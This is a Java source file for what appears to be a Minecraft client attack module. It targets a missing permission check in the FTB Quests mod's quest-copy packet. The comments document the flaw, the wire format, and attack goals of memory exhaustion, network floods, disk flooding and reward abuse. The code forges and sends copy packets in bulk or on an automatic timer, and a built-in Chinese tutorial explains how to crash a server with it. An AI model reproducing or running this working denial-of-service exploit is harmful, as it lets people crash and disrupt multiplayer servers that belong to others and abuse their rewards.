package com.redblue.red.modules.ftbquests;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import net.minecraft.client.Minecraft;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.List;

/**
 * FTQ-03: CopyQuestMessage has NO permission check.
 *
 * handle() directly copies quest + tasks + rewards, calls onCreated(),
 * broadcasts CreateObjectResponseMessage to all players, and markDirty().
 * No NetUtils.canEdit() guard.
 *
 * Wire: readLong(id) + readLong(chapterId) + readDouble(qx) + readDouble(qy) + readBoolean(copyDeps)
 *
 * Attack vectors:
 * 1. OOM DoS: mass-copy quests to exhaust server memory
 * 2. Network storm: each copy triggers sendToAll broadcasts
 * 3. Disk flood: all copies persisted via markDirty()
 * 4. Reward abuse: copy quests with CommandReward, then claim the copies
 */
public class FTQ03_QuestCopyDoS implements AttackModule {

    private static final Logger LOG = LoggerFactory.getLogger("ModCompat");
    private static final String MSG_CLASS = "dev.ftb.mods.ftbquests.net.CopyQuestMessage";

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "我了解这可能导致服务端崩溃", false),
        ConfigParam.ofString("quest_id", "源任务ID(十六进制/十进制)", ""),
        ConfigParam.ofString("chapter_id", "目标章节ID(十六进制/十进制)", ""),
        ConfigParam.ofBool("copy_deps", "复制依赖关系", true),
        ConfigParam.ofInt("copy_count", "每次执行复制数量", 10, 1, 1000),
        ConfigParam.ofInt("interval", "自动发包间隔(tick)", 5, 1, 200),
        ConfigParam.ofInt("auto_batch", "自动模式批量大小", 1, 1, 50)
    );

    private long lastTick = 0;

    @Override public String id() { return "ftq03_quest_copy_dos"; }
    @Override public String name() { return "任务复制DoS"; }
    @Override public String description() { return "大量复制任务数据造成服务端卡顿"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
             + "1. 从任务书中获取任务ID和章节ID\n"
             + "2. 设置复制数量并确认风险提示\n"
             + "3. 点击执行或启用自动模式\n\n"
             + "[参数说明]\n"
             + "- 源任务ID: 要复制的原始任务ID\n"
             + "- 目标章节ID: 复制到的目标章节\n"
             + "- 复制依赖关系: 是否同时复制任务依赖\n"
             + "- 每次执行复制数量: 单次点击执行时的复制次数\n"
             + "- 自动模式批量大小: 自动模式下每次触发的复制数\n\n"
             + "[注意事项]\n"
             + "- 必须勾选风险确认才能执行\n"
             + "- 大量复制可能导致服务端内存溢出或崩溃\n"
             + "- 每次复制都会触发全服广播, 注意网络负载";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ftbquests");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        long questId = parseLongParam("quest_id");
        long chapterId = parseLongParam("chapter_id");
        if (questId == 0 || chapterId == 0) return;

        int count = getParam("copy_count").map(ConfigParam::getInt).orElse(10);
        boolean copyDeps = getParam("copy_deps").map(ConfigParam::getBool).orElse(true);

        for (int i = 0; i < count; i++) {
            double x = (i % 50) * 2.0;
            double y = (i / 50) * 2.0;
            sendCopyPacket(questId, chapterId, x, y, copyDeps);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(5);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        long questId = parseLongParam("quest_id");
        long chapterId = parseLongParam("chapter_id");
        if (questId == 0 || chapterId == 0) return;

        int batch = getParam("auto_batch").map(ConfigParam::getInt).orElse(1);
        boolean copyDeps = getParam("copy_deps").map(ConfigParam::getBool).orElse(true);

        for (int i = 0; i < batch; i++) {
            double x = Math.random() * 1000 - 500;
            double y = Math.random() * 1000 - 500;
            sendCopyPacket(questId, chapterId, x, y, copyDeps);
        }
    }

    private long parseLongParam(String key) {
        String val = getParam(key).map(ConfigParam::getString).orElse("0");
        try {
            if (val.startsWith("0x") || val.startsWith("0X")) {
                return Long.parseUnsignedLong(val.substring(2), 16);
            }
            return Long.parseLong(val);
        } catch (NumberFormatException e) {
            return 0L;
        }
    }

    private void sendCopyPacket(long questId, long chapterId, double x, double y, boolean copyDeps) {
        try {
            Class<?> clz = Class.forName(MSG_CLASS);
            Constructor<?> ctor = clz.getDeclaredConstructor(FriendlyByteBuf.class);
            ctor.setAccessible(true);

            FriendlyByteBuf buf = new FriendlyByteBuf(io.netty.buffer.Unpooled.buffer());
            buf.writeLong(questId);
            buf.writeLong(chapterId);
            buf.writeDouble(x);
            buf.writeDouble(y);
            buf.writeBoolean(copyDeps);

            Object msg = ctor.newInstance(buf);
            buf.release();

            Method send = msg.getClass().getMethod("sendToServer");
            send.invoke(msg);
        } catch (Exception e) {
            LOG.error("[FTQ03] Failed to send CopyQuestMessage", e);
        }
    }
}
